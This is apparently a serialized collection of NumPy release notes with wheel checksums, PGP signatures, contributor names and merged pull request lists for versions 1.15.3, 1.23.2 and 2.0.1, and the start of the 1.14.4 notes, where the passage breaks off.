fa337b6bd5fe2b8c4e705f4102186feb9985de9bb8536d32d5129a658f1789e0  numpy-1.15.3-cp36-none-win_amd64.whl\n    2aa0910eaeb603b1a5598193cc3bc8eacf1baf6c95cbc3955eb8e15fa380c133  numpy-1.15.3-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    ef694fe72a3995aa778a5095bda946e0d31f7efabd5e8063ad8c6238ab7d3f78  numpy-1.15.3-cp37-cp37m-manylinux1_i686.whl\n    f1fd1a6f40a501ba4035f5ed2c1f4faa68245d1407bf97d2ee401e4f23d1720b  numpy-1.15.3-cp37-cp37m-manylinux1_x86_64.whl\n    094f8a83e5bd0a44a7557fa24a46db6ba7d5299c389ddbc9e0e18722f567fb63  numpy-1.15.3-cp37-none-win32.whl\n    a245464ddf6d90e2d6287e9cef6bcfda2a99467fdcf1b677b99cd0b6c7b43de2  numpy-1.15.3-cp37-none-win_amd64.whl\n    4656ea0d66a3724fd88aafa39a0c5cef216d1257a71b40534fe589abd46ba77b  numpy-1.15.3.tar.gz\n    1c0c80e74759fa4942298044274f2c11b08c86230b25b8b819e55e644f5ff2b6  numpy-1.15.3.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEcBAEBAgAGBQJbzgFyAAoJEGefIoN3xSR7H50H/3yAwCVQSIi7+JXPqcXGwDRK\ngFx877P2J7oCAyahnteRsMPU7iEI2CBZBaKlsWNbc6xXRtvvPjOU3RPdARMA/5dt\n21FvWKgy74ZalV/GmvV2oz8i4YEwzZsoaLaZoySoDOwTx0gCYKoB+K1iCbiTLj1p\npfoUAguZGXr5kj66Ls6EPUQJzrD4L+Ciw6JPDar7E6snP2mqF1Amx27RB7RqO7EU\njtcUMmOSmni9Gr/ZztdfpMKVPBR2BkQmMZudnzLrY+y2zlKXh4rPqzx/k59LgLKV\no64dmCtX4j9YjcIGhfGTlehEwZ2y3+qIct6+2vULFh4JlUCkUbANrtaQ8gBvlr4=\n=p90Y\n-----END PGP SIGNATURE-----\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.23.2": "==========================\n\nNumPy 1.23.2 is a maintenance release that fixes bugs discovered after the\n1.23.1 release. Notable features are:\n\n- Typing changes needed for Python 3.11\n- Wheels for Python 3.11.0rc1\n\nThe Python versions supported for this release are 3.8-3.11.\n\nContributors\n============\n\nA total of 9 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Alexander Grund +\n* Bas van Beek\n* Charles Harris\n* Jon Cusick +\n* Matti Picus\n* Michael Osthege +\n* Pal Barta +\n* Ross Barnowski\n* Sebastian Berg\n\nPull requests merged\n====================\n\nA total of 15 pull requests were merged for this release.\n\n* `22030 <https://github.com/numpy/numpy/pull/22030>`__: ENH: Add ``__array_ufunc__`` typing support to the ``nin=1`` ufuncs\n* `22031 <https://github.com/numpy/numpy/pull/22031>`__: MAINT, TYP: Fix ``np.angle`` dtype-overloads\n* `22032 <https://github.com/numpy/numpy/pull/22032>`__: MAINT: Do not let ``_GenericAlias`` wrap the underlying classes'...\n* `22033 <https://github.com/numpy/numpy/pull/22033>`__: TYP,MAINT: Allow ``einsum`` subscripts to be passed via integer...\n* `22034 <https://github.com/numpy/numpy/pull/22034>`__: MAINT,TYP: Add object-overloads for the ``np.generic`` rich comparisons\n* `22035 <https://github.com/numpy/numpy/pull/22035>`__: MAINT,TYP: Allow the ``squeeze`` and ``transpose`` method to...\n* `22036 <https://github.com/numpy/numpy/pull/22036>`__: BUG: Fix subarray to object cast ownership details\n* `22037 <https://github.com/numpy/numpy/pull/22037>`__: BUG: Use ``Popen`` to silently invoke f77 -v\n* `22038 <https://github.com/numpy/numpy/pull/22038>`__: BUG: Avoid errors on NULL during deepcopy\n* `22039 <https://github.com/numpy/numpy/pull/22039>`__: DOC: Add versionchanged for converter callable behavior.\n* `22057 <https://github.com/numpy/numpy/pull/22057>`__: MAINT: Quiet the anaconda uploads.\n* `22078 <https://github.com/numpy/numpy/pull/22078>`__: ENH: reorder includes for testing on top of system installations...\n* `22106 <https://github.com/numpy/numpy/pull/22106>`__: TST: fix test_linear_interpolation_formula_symmetric\n* `22107 <https://github.com/numpy/numpy/pull/22107>`__: BUG: Fix skip condition for test_loss_of_precision[complex256]\n* `22115 <https://github.com/numpy/numpy/pull/22115>`__: BLD: Build python3.11.0rc1 wheels.\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    fe1e3480ea8c417c8f7b05f543c1448d  numpy-1.23.2-cp310-cp310-macosx_10_9_x86_64.whl\n    0ab14b1afd0a55a374ca69b3b39cab3c  numpy-1.23.2-cp310-cp310-macosx_11_0_arm64.whl\n    df059e5405bfe75c0ac77b01abbdb237  numpy-1.23.2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    4ed412c4c078e96edf11ca3b11eef76b  numpy-1.23.2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    0caad53d9a5e3c5e8cd29f19a9f0c014  numpy-1.23.2-cp310-cp310-win32.whl\n    01e508b8b4f591daff128da1cfde8e1f  numpy-1.23.2-cp310-cp310-win_amd64.whl\n    8ecdb7e2a87255878b748550d91cfbe0  numpy-1.23.2-cp311-cp311-macosx_10_9_x86_64.whl\n    e3004aae46cec9e234f78eaf473272e0  numpy-1.23.2-cp311-cp311-macosx_11_0_arm64.whl\n    ec23c73caf581867d5ca9255b802f144  numpy-1.23.2-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    9b8389f528fe113247954248f0b78ce1  numpy-1.23.2-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    a54b136daa2fbb483909f08eecbfa3c5  numpy-1.23.2-cp311-cp311-win32.whl\n    ead32e141857c5ef33b1a6cd88aefc0f  numpy-1.23.2-cp311-cp311-win_amd64.whl\n    df1f18e52d0a2840d101fdc9c2c6af84  numpy-1.23.2-cp38-cp38-macosx_10_9_x86_64.whl\n    04c986880bb24fac2f44face75eab914  numpy-1.23.2-cp38-cp38-macosx_11_0_arm64.whl\n    edeba58edb214390112810f7ead903a8  numpy-1.23.2-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    c26ea699d94d7f1009c976c66cc4def3  numpy-1.23.2-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    c246a78b09f8893d998d449dcab0fac3  numpy-1.23.2-cp38-cp38-win32.whl\n    b5c5a2f961402259e301c49b8b05de55  numpy-1.23.2-cp38-cp38-win_amd64.whl\n    d156dfae94d33eeff7fb9c6e5187e049  numpy-1.23.2-cp39-cp39-macosx_10_9_x86_64.whl\n    7f2ad7867c577eab925a31de76486765  numpy-1.23.2-cp39-cp39-macosx_11_0_arm64.whl\n    76262a8e5d7a4d945446467467300a10  numpy-1.23.2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    8ee105f4574d61a2d494418b55f63fcb  numpy-1.23.2-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    2b7c79cae66023f8e716150223201981  numpy-1.23.2-cp39-cp39-win32.whl\n    d7af57dd070ccb165f3893412eb602e3  numpy-1.23.2-cp39-cp39-win_amd64.whl\n    355a231dbd87a0f2125cc23eb8f97075  numpy-1.23.2-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    4ab13c35056f67981d03f9ceec41db42  numpy-1.23.2-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    3a6f1e1256ee9be10d8cdf6be578fe52  numpy-1.23.2-pp38-pypy38_pp73-win_amd64.whl\n    9bf2a361509797de14ceee607387fe0f  numpy-1.23.2.tar.gz\n\nSHA256\n------\n::\n\n    e603ca1fb47b913942f3e660a15e55a9ebca906857edfea476ae5f0fe9b457d5  numpy-1.23.2-cp310-cp310-macosx_10_9_x86_64.whl\n    633679a472934b1c20a12ed0c9a6c9eb167fbb4cb89031939bfd03dd9dbc62b8  numpy-1.23.2-cp310-cp310-macosx_11_0_arm64.whl\n    17e5226674f6ea79e14e3b91bfbc153fdf3ac13f5cc54ee7bc8fdbe820a32da0  numpy-1.23.2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    bdc02c0235b261925102b1bd586579b7158e9d0d07ecb61148a1799214a4afd5  numpy-1.23.2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    df28dda02c9328e122661f399f7655cdcbcf22ea42daa3650a26bce08a187450  numpy-1.23.2-cp310-cp310-win32.whl\n    8ebf7e194b89bc66b78475bd3624d92980fca4e5bb86dda08d677d786fefc414  numpy-1.23.2-cp310-cp310-win_amd64.whl\n    dc76bca1ca98f4b122114435f83f1fcf3c0fe48e4e6f660e07996abf2f53903c  numpy-1.23.2-cp311-cp311-macosx_10_9_x86_64.whl\n    ecfdd68d334a6b97472ed032b5b37a30d8217c097acfff15e8452c710e775524  numpy-1.23.2-cp311-cp311-macosx_11_0_arm64.whl\n    5593f67e66dea4e237f5af998d31a43e447786b2154ba1ad833676c788f37cde  numpy-1.23.2-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    ac987b35df8c2a2eab495ee206658117e9ce867acf3ccb376a19e83070e69418  numpy-1.23.2-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    d98addfd3c8728ee8b2c49126f3c44c703e2b005d4a95998e2167af176a9e722  numpy-1.23.2-cp311-cp311-win32.whl\n    8ecb818231afe5f0f568c81f12ce50f2b828ff2b27487520d85eb44c71313b9e  numpy-1.23.2-cp311-cp311-win_amd64.whl\n    909c56c4d4341ec8315291a105169d8aae732cfb4c250fbc375a1efb7a844f8f  numpy-1.23.2-cp38-cp38-macosx_10_9_x86_64.whl\n    8247f01c4721479e482cc2f9f7d973f3f47810cbc8c65e38fd1bbd3141cc9842  numpy-1.23.2-cp38-cp38-macosx_11_0_arm64.whl\n    b8b97a8a87cadcd3f94659b4ef6ec056261fa1e1c3317f4193ac231d4df70215  numpy-1.23.2-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    bd5b7ccae24e3d8501ee5563e82febc1771e73bd268eef82a1e8d2b4d556ae66  numpy-1.23.2-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    9b83d48e464f393d46e8dd8171687394d39bc5abfe2978896b77dc2604e8635d  numpy-1.23.2-cp38-cp38-win32.whl\n    dec198619b7dbd6db58603cd256e092bcadef22a796f778bf87f8592b468441d  numpy-1.23.2-cp38-cp38-win_amd64.whl\n    4f41f5bf20d9a521f8cab3a34557cd77b6f205ab2116651f12959714494268b0  numpy-1.23.2-cp39-cp39-macosx_10_9_x86_64.whl\n    806cc25d5c43e240db709875e947076b2826f47c2c340a5a2f36da5bb10c58d6  numpy-1.23.2-cp39-cp39-macosx_11_0_arm64.whl\n    8f9d84a24889ebb4c641a9b99e54adb8cab50972f0166a3abc14c3b93163f074  numpy-1.23.2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    c403c81bb8ffb1c993d0165a11493fd4bf1353d258f6997b3ee288b0a48fce77  numpy-1.23.2-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    cf8c6aed12a935abf2e290860af8e77b26a042eb7f2582ff83dc7ed5f963340c  numpy-1.23.2-cp39-cp39-win32.whl\n    5e28cd64624dc2354a349152599e55308eb6ca95a13ce6a7d5679ebff2962913  numpy-1.23.2-cp39-cp39-win_amd64.whl\n    806970e69106556d1dd200e26647e9bee5e2b3f1814f9da104a943e8d548ca38  numpy-1.23.2-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    2bd879d3ca4b6f39b7770829f73278b7c5e248c91d538aab1e506c628353e47f  numpy-1.23.2-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    be6b350dfbc7f708d9d853663772a9310783ea58f6035eec649fb9c4371b5389  numpy-1.23.2-pp38-pypy38_pp73-win_amd64.whl\n    b78d00e48261fbbd04aa0d7427cf78d18401ee0abd89c7559bbf422e5b1c7d01  numpy-1.23.2.tar.gz\n\n\n.. currentmodule:: numpy\n\n==========================\n", "2.0.1": "==========================\n\nNumPy 2.0.1 is a maintenance release that fixes bugs and regressions\ndiscovered after the 2.0.0 release. NumPy 2.0.1 is the last planned\nrelease in the 2.0.x series, 2.1.0rc1 should be out shortly.\n\nThe Python versions supported by this release are 3.9-3.12.\n\nImprovements\n============\n\n``np.quantile`` with method ``closest_observation`` chooses nearest even order statistic\n----------------------------------------------------------------------------------------\nThis changes the definition of nearest for border cases from the nearest odd\norder statistic to nearest even order statistic. The numpy implementation now\nmatches other reference implementations.\n\n(`gh-26656 <https://github.com/numpy/numpy/pull/26656>`__)\n\nContributors\n============\n\nA total of 15 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* vahidmech +\n* Alex Herbert +\n* Charles Harris\n* Giovanni Del Monte +\n* Leo Singer\n* Lysandros Nikolaou\n* Matti Picus\n* Nathan Goldbaum\n* Patrick J. Roddy +\n* Raghuveer Devulapalli\n* Ralf Gommers\n* Rostan Tabet +\n* Sebastian Berg\n* Tyler Reddy\n* Yannik Wicke +\n\nPull requests merged\n====================\n\nA total of 24 pull requests were merged for this release.\n\n* `26711 <https://github.com/numpy/numpy/pull/26711>`__: MAINT: prepare 2.0.x for further development\n* `26792 <https://github.com/numpy/numpy/pull/26792>`__: TYP: fix incorrect import in ``ma/extras.pyi`` stub\n* `26793 <https://github.com/numpy/numpy/pull/26793>`__: DOC: Mention '1.25' legacy printing mode in ``set_printoptions``\n* `26794 <https://github.com/numpy/numpy/pull/26794>`__: DOC: Remove mention of NaN and NAN aliases from constants\n* `26821 <https://github.com/numpy/numpy/pull/26821>`__: BLD: Fix x86-simd-sort build failure on openBSD\n* `26822 <https://github.com/numpy/numpy/pull/26822>`__: BUG: Ensure output order follows input in numpy.fft\n* `26823 <https://github.com/numpy/numpy/pull/26823>`__: TYP: fix missing sys import in numeric.pyi\n* `26832 <https://github.com/numpy/numpy/pull/26832>`__: DOC: remove hack to override _add_newdocs_scalars (#26826)\n* `26835 <https://github.com/numpy/numpy/pull/26835>`__: BUG: avoid side-effect of 'include complex.h'\n* `26836 <https://github.com/numpy/numpy/pull/26836>`__: BUG: fix max_rows and chunked string/datetime reading in ``loadtxt``\n* `26837 <https://github.com/numpy/numpy/pull/26837>`__: BUG: fix PyArray_ImportNumPyAPI under -Werror=strict-prototypes\n* `26856 <https://github.com/numpy/numpy/pull/26856>`__: DOC: Update some documentation\n* `26868 <https://github.com/numpy/numpy/pull/26868>`__: BUG: fancy indexing copy\n* `26869 <https://github.com/numpy/numpy/pull/26869>`__: BUG: Mismatched allocation domains in ``PyArray_FillWithScalar``\n* `26870 <https://github.com/numpy/numpy/pull/26870>`__: BUG: Handle --f77flags and --f90flags for meson [wheel build]\n* `26887 <https://github.com/numpy/numpy/pull/26887>`__: BUG: Fix new DTypes and new string promotion when signature is...\n* `26888 <https://github.com/numpy/numpy/pull/26888>`__: BUG: remove numpy.f2py from excludedimports\n* `26959 <https://github.com/numpy/numpy/pull/26959>`__: BUG: Quantile closest_observation to round to nearest even order\n* `26960 <https://github.com/numpy/numpy/pull/26960>`__: BUG: Fix off-by-one error in amount of characters in strip\n* `26961 <https://github.com/numpy/numpy/pull/26961>`__: API: Partially revert unique with return_inverse\n* `26962 <https://github.com/numpy/numpy/pull/26962>`__: BUG,MAINT: Fix utf-8 character stripping memory access\n* `26963 <https://github.com/numpy/numpy/pull/26963>`__: BUG: Fix out-of-bound minimum offset for in1d table method\n* `26971 <https://github.com/numpy/numpy/pull/26971>`__: BUG: fix f2py tests to work with v2 API\n* `26995 <https://github.com/numpy/numpy/pull/26995>`__: BUG: Add object cast to avoid warning with limited API\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    a3e7d0f361ee7302448cae3c10844dd3  numpy-2.0.1-cp310-cp310-macosx_10_9_x86_64.whl\n    cff8546b69e43ae7b5050f05bdc25df2  numpy-2.0.1-cp310-cp310-macosx_11_0_arm64.whl\n    1713d23342528f4f8f4027970f010068  numpy-2.0.1-cp310-cp310-macosx_14_0_arm64.whl\n    20020d28606ea58f986a262daa6018f1  numpy-2.0.1-cp310-cp310-macosx_14_0_x86_64.whl\n    db22154ea943a707917aebc79e449bc5  numpy-2.0.1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    fe86cd85f240216f64eb076a62a229d2  numpy-2.0.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    e0ca08f85150af3cc6050d64e8c0bd27  numpy-2.0.1-cp310-cp310-musllinux_1_1_x86_64.whl\n    b76f432906f62e31f0e09c41f3f08b4c  numpy-2.0.1-cp310-cp310-musllinux_1_2_aarch64.whl\n    28e8109e4ef524fa5c272d6faec870ae  numpy-2.0.1-cp310-cp310-win32.whl\n    874beffaefdc73da42300ce691c2419c  numpy-2.0.1-cp310-cp310-win_amd64.whl\n    7bbe029f650c924e952da117842d456d  numpy-2.0.1-cp311-cp311-macosx_10_9_x86_64.whl\n    6d3d6ae26c520e93cef7f11ba3951f57  numpy-2.0.1-cp311-cp311-macosx_11_0_arm64.whl\n    de6082d719437eb7468ae31c407c503e  numpy-2.0.1-cp311-cp311-macosx_14_0_arm64.whl\n    d15a8d95661f8a1dfcc4eb089f9b46e8  numpy-2.0.1-cp311-cp311-macosx_14_0_x86_64.whl\n    c181105e074ee575ccf2c992e40f947a  numpy-2.0.1-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    00d22b299343fcdc78fbb0716ead6243  numpy-2.0.1-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    d9c4f49dbedb3f3d0158f00db459bd25  numpy-2.0.1-cp311-cp311-musllinux_1_1_x86_64.whl\n    63caa03e0625327ad3a756e01c83a6ca  numpy-2.0.1-cp311-cp311-musllinux_1_2_aarch64.whl\n    99d01d768a115d448ca2b4680de15191  numpy-2.0.1-cp311-cp311-win32.whl\n    8d1a31eccc8b9f077312095b11f62cb2  numpy-2.0.1-cp311-cp311-win_amd64.whl\n    6cc86f7761a33941d8c1c552186e774b  numpy-2.0.1-cp312-cp312-macosx_10_9_x86_64.whl\n    67c48f352afff5f41108f1b9561d1d5c  numpy-2.0.1-cp312-cp312-macosx_11_0_arm64.whl\n    1068d4eadcac6a869e0e457853b7e611  numpy-2.0.1-cp312-cp312-macosx_14_0_arm64.whl\n    dfb667450315fddcf84381fc8ef16892  numpy-2.0.1-cp312-cp312-macosx_14_0_x86_64.whl\n    69822bbbbb65d8a7d00ae32b435f61cc  numpy-2.0.1-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    883ed6c41395fb2def6cc0d64dcb817f  numpy-2.0.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    4b1e9fd464821a7d1de3a8ddf911311e  numpy-2.0.1-cp312-cp312-musllinux_1_1_x86_64.whl\n    79e6557f40b8ed8f5973b404d98eab3d  numpy-2.0.1-cp312-cp312-musllinux_1_2_aarch64.whl\n    85596f15d4cf85c2f78b4cc12c2cad1e  numpy-2.0.1-cp312-cp312-win32.whl\n    487c7c2944306f62b3770576ce903a91  numpy-2.0.1-cp312-cp312-win_amd64.whl\n    491093641afa21e65d6e629eb70571fc  numpy-2.0.1-cp39-cp39-macosx_10_9_x86_64.whl\n    5008b16c20f3d7e5a0c7764712f8908e  numpy-2.0.1-cp39-cp39-macosx_11_0_arm64.whl\n    14633b898f863ea797c40ba1cf226c29  numpy-2.0.1-cp39-cp39-macosx_14_0_arm64.whl\n    9054ecb69d21b364e59e94aab24247cb  numpy-2.0.1-cp39-cp39-macosx_14_0_x86_64.whl\n    be028cf4bb691921943939de17593dd7  numpy-2.0.1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    9c440ad02ff0a954f696637de37aab2d  numpy-2.0.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    27aec0d286eabe26d8e9149f4572dba1  numpy-2.0.1-cp39-cp39-musllinux_1_1_x86_64.whl\n    b02eda82ee511ee27185c8a4073ea35c  numpy-2.0.1-cp39-cp39-musllinux_1_2_aarch64.whl\n    cf579b902325e023b2dc444692eb5991  numpy-2.0.1-cp39-cp39-win32.whl\n    302c8c3118a5f55d9ef35ed8e517f6b1  numpy-2.0.1-cp39-cp39-win_amd64.whl\n    34c17fe980accfb76c6f348f85b3cfef  numpy-2.0.1-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    02676eb84379b0a223288d6fd9d76942  numpy-2.0.1-pp39-pypy39_pp73-macosx_14_0_x86_64.whl\n    b5300e6fe110bf69e1a8901c5c09e3f8  numpy-2.0.1-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    204a3ea7fb851e08d166c74f73f9b8a3  numpy-2.0.1-pp39-pypy39_pp73-win_amd64.whl\n    5df3c50fc124c3167404d396115898d0  numpy-2.0.1.tar.gz\n\nSHA256\n------\n::\n\n    0fbb536eac80e27a2793ffd787895242b7f18ef792563d742c2d673bfcb75134  numpy-2.0.1-cp310-cp310-macosx_10_9_x86_64.whl\n    69ff563d43c69b1baba77af455dd0a839df8d25e8590e79c90fcbe1499ebde42  numpy-2.0.1-cp310-cp310-macosx_11_0_arm64.whl\n    1b902ce0e0a5bb7704556a217c4f63a7974f8f43e090aff03fcf262e0b135e02  numpy-2.0.1-cp310-cp310-macosx_14_0_arm64.whl\n    f1659887361a7151f89e79b276ed8dff3d75877df906328f14d8bb40bb4f5101  numpy-2.0.1-cp310-cp310-macosx_14_0_x86_64.whl\n    4658c398d65d1b25e1760de3157011a80375da861709abd7cef3bad65d6543f9  numpy-2.0.1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    4127d4303b9ac9f94ca0441138acead39928938660ca58329fe156f84b9f3015  numpy-2.0.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    e5eeca8067ad04bc8a2a8731183d51d7cbaac66d86085d5f4766ee6bf19c7f87  numpy-2.0.1-cp310-cp310-musllinux_1_1_x86_64.whl\n    9adbd9bb520c866e1bfd7e10e1880a1f7749f1f6e5017686a5fbb9b72cf69f82  numpy-2.0.1-cp310-cp310-musllinux_1_2_aarch64.whl\n    7b9853803278db3bdcc6cd5beca37815b133e9e77ff3d4733c247414e78eb8d1  numpy-2.0.1-cp310-cp310-win32.whl\n    81b0893a39bc5b865b8bf89e9ad7807e16717f19868e9d234bdaf9b1f1393868  numpy-2.0.1-cp310-cp310-win_amd64.whl\n    75b4e316c5902d8163ef9d423b1c3f2f6252226d1aa5cd8a0a03a7d01ffc6268  numpy-2.0.1-cp311-cp311-macosx_10_9_x86_64.whl\n    6e4eeb6eb2fced786e32e6d8df9e755ce5be920d17f7ce00bc38fcde8ccdbf9e  numpy-2.0.1-cp311-cp311-macosx_11_0_arm64.whl\n    a1e01dcaab205fbece13c1410253a9eea1b1c9b61d237b6fa59bcc46e8e89343  numpy-2.0.1-cp311-cp311-macosx_14_0_arm64.whl\n    a8fc2de81ad835d999113ddf87d1ea2b0f4704cbd947c948d2f5513deafe5a7b  numpy-2.0.1-cp311-cp311-macosx_14_0_x86_64.whl\n    5a3d94942c331dd4e0e1147f7a8699a4aa47dffc11bf8a1523c12af8b2e91bbe  numpy-2.0.1-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    15eb4eca47d36ec3f78cde0a3a2ee24cf05ca7396ef808dda2c0ddad7c2bde67  numpy-2.0.1-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    b83e16a5511d1b1f8a88cbabb1a6f6a499f82c062a4251892d9ad5d609863fb7  numpy-2.0.1-cp311-cp311-musllinux_1_1_x86_64.whl\n    1f87fec1f9bc1efd23f4227becff04bd0e979e23ca50cc92ec88b38489db3b55  numpy-2.0.1-cp311-cp311-musllinux_1_2_aarch64.whl\n    36d3a9405fd7c511804dc56fc32974fa5533bdeb3cd1604d6b8ff1d292b819c4  numpy-2.0.1-cp311-cp311-win32.whl\n    08458fbf403bff5e2b45f08eda195d4b0c9b35682311da5a5a0a0925b11b9bd8  numpy-2.0.1-cp311-cp311-win_amd64.whl\n    6bf4e6f4a2a2e26655717a1983ef6324f2664d7011f6ef7482e8c0b3d51e82ac  numpy-2.0.1-cp312-cp312-macosx_10_9_x86_64.whl\n    7d6fddc5fe258d3328cd8e3d7d3e02234c5d70e01ebe377a6ab92adb14039cb4  numpy-2.0.1-cp312-cp312-macosx_11_0_arm64.whl\n    5daab361be6ddeb299a918a7c0864fa8618af66019138263247af405018b04e1  numpy-2.0.1-cp312-cp312-macosx_14_0_arm64.whl\n    ea2326a4dca88e4a274ba3a4405eb6c6467d3ffbd8c7d38632502eaae3820587  numpy-2.0.1-cp312-cp312-macosx_14_0_x86_64.whl\n    529af13c5f4b7a932fb0e1911d3a75da204eff023ee5e0e79c1751564221a5c8  numpy-2.0.1-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    6790654cb13eab303d8402354fabd47472b24635700f631f041bd0b65e37298a  numpy-2.0.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    cbab9fc9c391700e3e1287666dfd82d8666d10e69a6c4a09ab97574c0b7ee0a7  numpy-2.0.1-cp312-cp312-musllinux_1_1_x86_64.whl\n    99d0d92a5e3613c33a5f01db206a33f8fdf3d71f2912b0de1739894668b7a93b  numpy-2.0.1-cp312-cp312-musllinux_1_2_aarch64.whl\n    173a00b9995f73b79eb0191129f2455f1e34c203f559dd118636858cc452a1bf  numpy-2.0.1-cp312-cp312-win32.whl\n    bb2124fdc6e62baae159ebcfa368708867eb56806804d005860b6007388df171  numpy-2.0.1-cp312-cp312-win_amd64.whl\n    bfc085b28d62ff4009364e7ca34b80a9a080cbd97c2c0630bb5f7f770dae9414  numpy-2.0.1-cp39-cp39-macosx_10_9_x86_64.whl\n    8fae4ebbf95a179c1156fab0b142b74e4ba4204c87bde8d3d8b6f9c34c5825ef  numpy-2.0.1-cp39-cp39-macosx_11_0_arm64.whl\n    72dc22e9ec8f6eaa206deb1b1355eb2e253899d7347f5e2fae5f0af613741d06  numpy-2.0.1-cp39-cp39-macosx_14_0_arm64.whl\n    ec87f5f8aca726117a1c9b7083e7656a9d0d606eec7299cc067bb83d26f16e0c  numpy-2.0.1-cp39-cp39-macosx_14_0_x86_64.whl\n    1f682ea61a88479d9498bf2091fdcd722b090724b08b31d63e022adc063bad59  numpy-2.0.1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    8efc84f01c1cd7e34b3fb310183e72fcdf55293ee736d679b6d35b35d80bba26  numpy-2.0.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    3fdabe3e2a52bc4eff8dc7a5044342f8bd9f11ef0934fcd3289a788c0eb10018  numpy-2.0.1-cp39-cp39-musllinux_1_1_x86_64.whl\n    24a0e1befbfa14615b49ba9659d3d8818a0f4d8a1c5822af8696706fbda7310c  numpy-2.0.1-cp39-cp39-musllinux_1_2_aarch64.whl\n    f9cf5ea551aec449206954b075db819f52adc1638d46a6738253a712d553c7b4  numpy-2.0.1-cp39-cp39-win32.whl\n    e9e81fa9017eaa416c056e5d9e71be93d05e2c3c2ab308d23307a8bc4443c368  numpy-2.0.1-cp39-cp39-win_amd64.whl\n    61728fba1e464f789b11deb78a57805c70b2ed02343560456190d0501ba37b0f  numpy-2.0.1-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    12f5d865d60fb9734e60a60f1d5afa6d962d8d4467c120a1c0cda6eb2964437d  numpy-2.0.1-pp39-pypy39_pp73-macosx_14_0_x86_64.whl\n    eacf3291e263d5a67d8c1a581a8ebbcfd6447204ef58828caf69a5e3e8c75990  numpy-2.0.1-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    2c3a346ae20cfd80b6cfd3e60dc179963ef2ea58da5ec074fd3d9e7a1e7ba97f  numpy-2.0.1-pp39-pypy39_pp73-win_amd64.whl\n    485b87235796410c3519a699cfe1faab097e509e90ebb05dcd098db2ae87e7b3  numpy-2.0.1.tar.gz\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA1\n\n==========================\n", "1.14.4": "==========================\n\nThis is a bugfix release for bugs reported following the 1.14.3 release. The\nmost significant fixes are:\n\n* fixes for compiler instruction reordering that resulted in NaN's not being\n  properly propagated in `np.max` and `np.min`,\n\n* fixes for bus faults on SPARC and older ARM due to incorrect alignment\n  checks.\n\nThere are also improvements to printing of long doubles on PPC platforms. All\nis not yet perfect on that platform, the whitespace padding is still incorrect\nand is to be fixed in numpy 1.15, consequently NumPy still fails some\nprinting-related (and other) unit tests on ppc systems. However, the printed\nvalues are now correct.\n\nNote that NumPy will error on import if it detects incorrect float32 `dot`\nresults. This problem has been seen on the Mac when working in the Anaconda\nenviroment and is due to a subtle interaction between MKL and PyQt5.  It is not\nstrictly a NumPy problem, but it is best that users be aware of it.  See the\ngh-8577 NumPy issue for more information.\n\nThe Python versions supported in this release are 2.7 and 3.4 - 3.6. The Python\n3.6 wheels available from PIP are built with Python 3.6.2 and should be\ncompatible with all previous versions of Python 3.6. The source releases were\ncythonized with Cython 0.28.2 and should work for the upcoming Python 3.7.\n\nContributors\n============\n\nA total of 7 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Allan Haldane\n* Charles Harris\n* Marten van Kerkwijk\n* Matti Picus\n* Pauli 